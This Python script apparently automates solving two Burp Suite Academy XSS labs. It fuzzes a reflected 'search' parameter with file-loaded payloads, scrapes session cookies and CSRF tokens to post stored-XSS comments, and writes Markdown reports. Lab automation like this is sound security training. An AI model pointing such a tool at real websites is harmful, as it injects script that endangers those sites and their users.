import requests
from bs4 import BeautifulSoup
import re
import os
from datetime import datetime
from colorama import Fore, Style, init
from urllib.parse import urlencode, urlparse

# Initialize Colorama for cross-platform compatibility
init(autoreset=True)

# Define paths relative to the project root
PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOGS_DIR = os.path.join(PROJECT_ROOT, "logs")
REPORTS_DIR = os.path.join(PROJECT_ROOT, "report")
PAYLOADS_DIR = os.path.join(PROJECT_ROOT, "payloads")

# Ensure directories exist
os.makedirs(LOGS_DIR, exist_ok=True)
os.makedirs(REPORTS_DIR, exist_ok=True)
os.makedirs(PAYLOADS_DIR, exist_ok=True)

def log_message(message, level="INFO", log_file="xss_solver.log"):
    """Logs messages to a specified log file and prints to console with color."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    color = ""
    prefix = ""
    if level == "INFO":
        color = Fore.CYAN
    elif level == "WARNING":
        color = Fore.YELLOW
    elif level == "ERROR":
        color = Fore.RED
    elif level == "SUCCESS":
        color = Fore.GREEN
        prefix = "🎉 " # Add a celebration emoji for success
    elif level == "DEBUG":
        color = Fore.MAGENTA
    
    console_output = f"{color}[{timestamp}] [{level}] {prefix}{message}{Style.RESET_ALL}"
    file_output = f"[{timestamp}] [{level}] {message}"
    
    with open(os.path.join(LOGS_DIR, log_file), "a") as f:
        f.write(file_output + "\n")
    print(console_output)

def create_report(lab_name, url, method, payload, status, vulnerable_parameter=None, bypass_technique_info="N/A", response_text=None, request_details=None, form_fields=None):
    """
    Creates a detailed report in a more readable Markdown-like format,
    including vulnerability specifics and potentially form fields.
    """
    sanitized_lab_name = re.sub(r'[^\w\-_\. ]', '', lab_name).replace(' ', '_')
    report_filename = f"{sanitized_lab_name}_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
    report_path = os.path.join(REPORTS_DIR, report_filename)
    
    with open(report_path, "w") as f:
        f.write(f"# XSS Lab Report: {lab_name}\n\n")
        f.write(f"**Date & Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"**Status:** **{status}**\n\n")
        
        f.write(f"## Vulnerability Details\n")
        f.write(f"- **Type:** {'Stored XSS' if 'Stored XSS' in lab_name else 'Reflected XSS'}\n")
        f.write(f"- **Vulnerable Parameter:** `{vulnerable_parameter if vulnerable_parameter else 'Not specified'}`\n")
        f.write(f"- **Payload Used:** `{payload}`\n")
        f.write(f"- **Bypass Technique/Function:** `{bypass_technique_info}`\n\n")
        
        f.write(f"## Request Information\n")
        f.write(f"**Method:** `{method}`\n")
        f.write(f"**Target URL:** `{url}`\n")
        if form_fields:
            f.write(f"**Form Fields (if POST):**\n")
            f.write(f"```json\n")
            for field, value in form_fields.items():
                if field == "comment" and payload in value:
                    f.write(f'  "{field}": "{value.replace("<", "&lt;").replace(">", "&gt;")}"\n')
                else:
                    f.write(f'  "{field}": "{value}"\n')
            f.write(f"```\n\n")

        if request_details:
            f.write(f"**Full Request (Simplified):**\n")
            f.write(f"```http\n")
            f.write(request_details + "\n")
            f.write(f"```\n\n")
        
        if response_text:
            f.write(f"## Response Details\n")
            f.write(f"```html\n")
            snippet_start = response_text.find(payload)
            if snippet_start != -1:
                start_index = max(0, snippet_start - 200)
                end_index = min(len(response_text), snippet_start + len(payload) + 200)
                f.write(response_text[start_index:end_index] + "\n")
                if len(response_text) > end_index or snippet_start - 200 > 0:
                    f.write("\n... (Full response truncated for brevity) ...\n")
            else:
                f.write("Payload not directly found in relevant snippet. Showing beginning of response.\n")
                f.write(response_text[:1000] + "\n...\n")
            f.write(f"```\n")
            f.write(f"\n**Full Response Length:** {len(response_text)} bytes\n")

    log_message(f"Report generated: {report_path}", level="INFO")

def read_payloads(payloads_file="xss_payloads.txt"):
    """Reads XSS payloads from a specified file."""
    payloads_path = os.path.join(PAYLOADS_DIR, payloads_file)
    payloads = []
    try:
        with open(payloads_path, "r") as f:
            for line in f:
                payload = line.strip()
                if payload and not payload.startswith("#"):
                    payloads.append(payload)
        log_message(f"Loaded {len(payloads)} payloads from {payloads_path}", level="INFO")
    except FileNotFoundError:
        log_message(f"Payloads file not found: {payloads_path}. Please create it.", level="ERROR", log_file="xss_errors.log")
    return payloads

def read_targets(targets_file="targets.txt"):
    """
    Reads target URLs from a specified file.
    Each line should contain only a URL.
    """
    targets_path = os.path.join(LOGS_DIR, targets_file)
    urls = []
    try:
        with open(targets_path, "r") as f:
            for line in f:
                url = line.strip()
                if url and not url.startswith("#"):
                    urls.append(url)
        log_message(f"Loaded {len(urls)} targets from {targets_path}", level="INFO")
    except FileNotFoundError:
        log_message(f"Targets file not found: {targets_path}. Please create it.", level="ERROR", log_file="xss_errors.log")
    return urls

def solve_lab_reflected_xss_search_param(base_url, lab_name, payloads):
    """
    Solves a generic Reflected XSS lab, typically involving a GET request with a 'search' parameter.
    This applies to Burp Suite Lab 1 and similar.
    """
    log_message(f"\n" + "="*50, level="INFO")
    log_message(f"--- Starting Test for Lab: {lab_name} ---", level="INFO")
    log_message(f"Target Base URL: {base_url}", level="INFO")
    log_message(f"Vulnerable Parameter (assumed): 'search'", level="INFO")
    log_message(f"Method: GET", level="INFO")
    log_message(f"="*50 + "\n", level="INFO")

    solved = False
    vulnerable_parameter = "search"

    for i, payload in enumerate(payloads):
        full_url_with_payload = f"{base_url}/?{vulnerable_parameter}={payload}"
        http_method = "GET"
        
        request_details_for_report = f"{http_method} /?{vulnerable_parameter}={payload} HTTP/1.1\nHost: {urlparse(base_url).netloc}\nUser-Agent: Python-Requests/{requests.__version__}"
        
        log_message(f"[{i+1}/{len(payloads)}] Testing payload: {payload}", level="CYAN")

        try:
            response = requests.get(full_url_with_payload, timeout=15)
            
            if "Congratulations, you solved the lab!" in response.text:
                log_message(f"!!! LAB SOLVED: {lab_name} !!!", level="SUCCESS")
                log_message(f"Vulnerable Parameter: '{vulnerable_parameter}'", level="SUCCESS")
                log_message(f"Method Used: {http_method}", level="SUCCESS")
                log_message(f"Payload Used: {payload}", level="SUCCESS")
                log_message(f"Bypass Technique (General): Reflected XSS - Direct HTML Injection", level="SUCCESS") 
                
                create_report(
                    lab_name=lab_name,
                    url=full_url_with_payload,
                    method=http_method,
                    payload=payload,
                    status="SOLVED",
                    vulnerable_parameter=vulnerable_parameter,
                    bypass_technique_info="Reflected XSS - Direct HTML Injection",
                    response_text=response.text,
                    request_details=request_details_for_report
                )
                solved = True
                break
            elif payload in response.text:
                log_message(f"WARNING: Payload '{payload}' reflected in response. Potentially vulnerable, but lab not confirmed solved.", level="WARNING")
            else:
                log_message(f"INFO: Payload '{payload}' not found in response, or lab not solved.", level="INFO")
            
        except requests.exceptions.Timeout:
            log_message(f"ERROR: Request timed out for {full_url_with_payload}", level="ERROR", log_file="xss_errors.log")
            create_report(lab_name, full_url_with_payload, http_method, payload, "TIMEOUT_ERROR", vulnerable_parameter, "N/A", request_details=request_details_for_report)
        except requests.exceptions.ConnectionError as e:
            log_message(f"ERROR: Connection error for {full_url_with_payload} - {e}", level="ERROR", log_file="xss_errors.log")
            create_report(lab_name, full_url_with_payload, http_method, payload, f"CONNECTION_ERROR: {e}", vulnerable_parameter, "N/A", request_details=request_details_for_report)
        except requests.exceptions.RequestException as e:
            log_message(f"ERROR: Request failed for {full_url_with_payload} - {e}", level="ERROR", log_file="xss_errors.log")
            create_report(lab_name, full_url_with_payload, http_method, payload, f"REQUEST_ERROR: {e}", vulnerable_parameter, "N/A", request_details=request_details_for_report)
        except Exception as e:
            log_message(f"AN UNEXPECTED ERROR OCCURRED: {e}", level="ERROR", log_file="xss_errors.log")
            create_report(lab_name, full_url_with_payload, http_method, payload, f"UNEXPECTED_ERROR: {e}", vulnerable_parameter, "N/A", request_details=request_details_for_report)
    
    if not solved:
        log_message(f"\n--- Lab: {lab_name} NOT SOLVED with current payloads. ---", level="WARNING")
        log_message(f"Consider adding more specific payloads or checking the lab environment.", level="WARNING")
        create_report(lab_name, base_url, "GET", "N/A", "NOT_SOLVED_ALL_PAYLOADS_TRIED", vulnerable_parameter, "N/A")
    log_message(f"\n" + "="*50 + "\n", level="INFO")
    return solved

def solve_lab_stored_xss_comment_form(base_url, lab_name, payloads):
    """
    Solves Burp Suite Lab: Stored XSS into HTML context with nothing encoded.
    This lab requires fetching a post page to extract session cookie and CSRF token,
    then posting a comment with the payload.
    """
    log_message(f"\n" + "="*50, level="INFO")
    log_message(f"--- Starting Test for Lab: {lab_name} ---", level="INFO")
    log_message(f"Target Base URL: {base_url}", level="INFO")
    log_message(f"Vulnerable Parameters: 'comment', 'name', 'email', 'website', 'csrf', 'postId'", level="INFO")
    log_message(f"Method: POST", level="INFO")
    log_message(f"="*50 + "\n", level="INFO")

    solved = False
    
    # Step 1: Fetch a post page to extract session cookie and CSRF token
    post_page_url = f"{base_url}/post?postId=1"
    
    log_message(f"Step 1: Fetching post page at {post_page_url} to extract session and CSRF token...", level="INFO")
    try:
        initial_response = requests.get(post_page_url, timeout=15)
        initial_response.raise_for_status()
    except requests.exceptions.RequestException as e:
        log_message(f"ERROR: Failed to fetch post page {post_page_url} - {e}", level="ERROR", log_file="xss_errors.log")
        create_report(lab_name, post_page_url, "GET", "N/A", f"FETCH_POST_ERROR: {e}", "N/A", "N/A")
        return False
    
    session_cookie = initial_response.cookies.get("session")
    
    csrf_match = re.findall(r"name=\"csrf\" value=\"(.+?)\"", initial_response.text)
    csrf_token = csrf_match[0] if csrf_match else None

    if not session_cookie:
        log_message("WARNING: Session cookie not found.", level="WARNING")
    if not csrf_token:
        log_message("ERROR: CSRF token not found. Cannot proceed with comment post.", level="ERROR", log_file="xss_errors.log")
        create_report(lab_name, post_page_url, "GET", "N/A", "CSRF_TOKEN_MISSING", "N/A", "N/A", response_text=initial_response.text)
        return False

    log_message(f"Extracted Session: {session_cookie}", level="INFO")
    log_message(f"Extracted CSRF Token: {csrf_token}", level="INFO")
    
    # Step 2: Prepare to post a comment
    comment_submit_path = "/post/comment"
    post_target_url = f"{base_url.rstrip('/')}{comment_submit_path}"
    
    blog_page_url_to_check = post_page_url 

    for i, payload in enumerate(payloads):
        http_method = "POST"
        
        form_data = {
            "comment": payload,
            "csrf": csrf_token,
            "postId": "1",
            "name": "Hacker",
            "email": "hack@me.com",
        }
        
        cookies_to_send = {"session": session_cookie} if session_cookie else {}
        
        encoded_form_data = urlencode(form_data)

        request_details_for_report = (
            f"{http_method} {comment_submit_path} HTTP/1.1\n"
            f"Host: {urlparse(base_url).netloc}\n"
            f"User-Agent: Python-Requests/{requests.__version__}\n"
            f"Cookie: session={session_cookie}\n"
            f"Content-Type: application/x-www-form-urlencoded\n"
            f"Content-Length: {len(encoded_form_data)}\n\n"
            f"{encoded_form_data}"
        )
        
        log_message(f"[{i+1}/{len(payloads)}] Testing payload: {payload}", level="CYAN")
        log_message(f"Submitting to: {post_target_url}", level="DEBUG")
        log_message(f"Form data: {form_data}", level="DEBUG")
        log_message(f"Cookies: {cookies_to_send}", level="DEBUG")

        try:
            response = requests.post(post_target_url, data=form_data, cookies=cookies_to_send, timeout=15, allow_redirects=True)
            log_message(f"POST Request Final URL: {response.url}", level="INFO")
            log_message(f"POST Response status code: {response.status_code}", level="INFO")

            if "Congratulations, you solved the lab!" in response.text:
                log_message(f"!!! LAB SOLVED: {lab_name} !!!", level="SUCCESS")
                log_message(f"Vulnerable Parameter: 'comment' (POST field)", level="SUCCESS")
                log_message(f"Method Used: {http_method}", level="SUCCESS")
                log_message(f"Payload Used: {payload}", level="SUCCESS")
                log_message(f"Bypass Technique (General): Stored XSS via Comment Form (CSRF bypassed)", level="SUCCESS")
                
                create_report(
                    lab_name=lab_name,
                    url=response.url,
                    method=http_method, 
                    payload=payload,
                    status="SOLVED",
                    vulnerable_parameter="comment",
                    bypass_technique_info="Stored XSS via Comment Form (CSRF bypassed)",
                    response_text=response.text,
                    request_details=request_details_for_report,
                    form_fields=form_data
                )
                solved = True
                break 

            log_message(f"Checking blog page for XSS trigger at {blog_page_url_to_check}", level="INFO")
            blog_response = requests.get(blog_page_url_to_check, cookies=cookies_to_send, timeout=15)
            
            if "Congratulations, you solved the lab!" in blog_response.text:
                log_message(f"!!! LAB SOLVED: {lab_name} !!!", level="SUCCESS")
                log_message(f"Vulnerable Parameter: 'comment' (POST field)", level="SUCCESS")
                log_message(f"Method Used: {http_method}", level="SUCCESS")
                log_message(f"Payload Used: {payload}", level="SUCCESS")
                log_message(f"Bypass Technique (General): Stored XSS via Comment Form (CSRF bypassed)", level="SUCCESS")
                
                create_report(
                    lab_name=lab_name,
                    url=blog_page_url_to_check, 
                    method=http_method, 
                    payload=payload,
                    status="SOLVED",
                    vulnerable_parameter="comment",
                    bypass_technique_info="Stored XSS via Comment Form (CSRF bypassed, Triggered on Blog Page)",
                    response_text=blog_response.text,
                    request_details=request_details_for_report,
                    form_fields=form_data
                )
                solved = True
                break
            elif payload in blog_response.text:
                 log_message(f"WARNING: Payload '{payload}' reflected in blog page. Potentially vulnerable.", level="WARNING")
            else:
                log_message(f"INFO: Payload '{payload}' not found in blog page, or lab not solved.", level="INFO")


        except requests.exceptions.Timeout:
            log_message(f"ERROR: Request timed out for {post_target_url}", level="ERROR", log_file="xss_errors.log")
            create_report(lab_name, post_target_url, http_method, payload, "TIMEOUT_ERROR", "comment", "N/A", request_details=request_details_for_report, form_fields=form_data)
        except requests.exceptions.ConnectionError as e:
            log_message(f"ERROR: Connection error for {post_target_url} - {e}", level="ERROR", log_file="xss_errors.log")
            create_report(lab_name, post_target_url, http_method, payload, f"CONNECTION_ERROR: {e}", "comment", "N/A", request_details=request_details_for_report, form_fields=form_data)
        except requests.exceptions.RequestException as e:
            log_message(f"ERROR: Request failed for {post_target_url} - {e}", level="ERROR", log_file="xss_errors.log")
            create_report(lab_name, post_target_url, http_method, payload, f"REQUEST_ERROR: {e}", "comment", "N/A", request_details=request_details_for_report, form_fields=form_data)
        except Exception as e:
            log_message(f"AN UNEXPECTED ERROR OCCURRED: {e}", level="ERROR", log_file="xss_errors.log")
            create_report(lab_name, post_target_url, http_method, payload, f"UNEXPECTED_ERROR: {e}", "comment", "N/A", request_details=request_details_for_report, form_fields=form_data)
    
    if not solved:
        log_message(f"\n--- Lab: {lab_name} NOT SOLVED with current payloads. ---", level="WARNING")
        log_message(f"Consider adding more specific payloads or checking the lab environment.", level="WARNING")
        create_report(lab_name, base_url, "POST", "N/A", "NOT_SOLVED_ALL_PAYLOADS_TRIED", "comment", "N/A")
    log_message(f"\n" + "="*50 + "\n", level="INFO")
    return solved

LAB_SOLVER_FUNCTIONS = [
    solve_lab_reflected_xss_search_param,
    solve_lab_stored_xss_comment_form
]

def main():
    log_message("Starting XSS Lab Solver...", level="INFO")
    
    payloads = read_payloads()
    if not payloads:
        log_message("No payloads loaded. Exiting.", level="ERROR")
        return

    targets = read_targets()
    if not targets:
        log_message("No targets loaded. Exiting.", level="ERROR")
        return
    
    overall_results = {}
    
    # Store detailed success messages to print at the end
    detailed_success_messages = []

    for i, target_url in enumerate(targets):
        lab_name_to_use = f"Burp Suite Lab {i+1}"
        
        if i == 0:
            lab_name_to_use = "Burp Suite Lab 1: Reflected XSS into HTML context with nothing encoded"
        elif i == 1:
            lab_name_to_use = "Burp Suite Lab 2: Stored XSS into HTML context with nothing encoded"

        if i < len(LAB_SOLVER_FUNCTIONS):
            solver_function = LAB_SOLVER_FUNCTIONS[i]
        else:
            log_message(f"WARNING: No specific solver defined for Lab {i+1} ({target_url}). Using default (Lab 1) solver.", level="WARNING")
            solver_function = solve_lab_reflected_xss_search_param

        if "YOUR_BURP_LAB" in target_url:
            log_message(f"WARNING: Placeholder URL found for {lab_name_to_use}: {target_url}. Please replace it with an actual lab URL.", level="WARNING", log_file="xss_solver_warnings.log")
            overall_results[lab_name_to_use] = "SKIPPED (Placeholder URL)"
            continue
        
        log_message(f"\n***** Processing Target {i+1} of {len(targets)}: {lab_name_to_use} *****", level="INFO")
        
        # Capture the output from the solver function directly for cleaner presentation
        # We need to modify the solver functions slightly to return these details for aggregation
        # For now, we'll rely on the existing log_message calls within the solver functions
        # and just update the summary logic.
        lab_solved = solver_function(target_url, lab_name_to_use, payloads)
        if lab_solved:
            overall_results[lab_name_to_use] = "SOLVED"
            # The detailed success message is now printed directly by the solver functions,
            # so we only need the summary here.
        else:
            overall_results[lab_name_to_use] = "NOT SOLVED"
    
    # Final Summary - concise and at the end
    log_message("\n" + "="*50, level="INFO")
    log_message("--- XSS Lab Solver - Final Summary ---", level="INFO")
    log_message("="*50, level="INFO")
    for lab, status in overall_results.items():
        if status == "SOLVED":
            log_message(f"- {lab}: {status}", level="SUCCESS")
        elif status == "NOT SOLVED":
            log_message(f"- {lab}: {status}", level="WARNING")
        else:
            log_message(f"- {lab}: {status}", level="INFO")
    log_message("="*50 + "\n", level="INFO")
    log_message("XSS Lab Solver finished.", level="INFO")

if __name__ == "__main__":
    main()
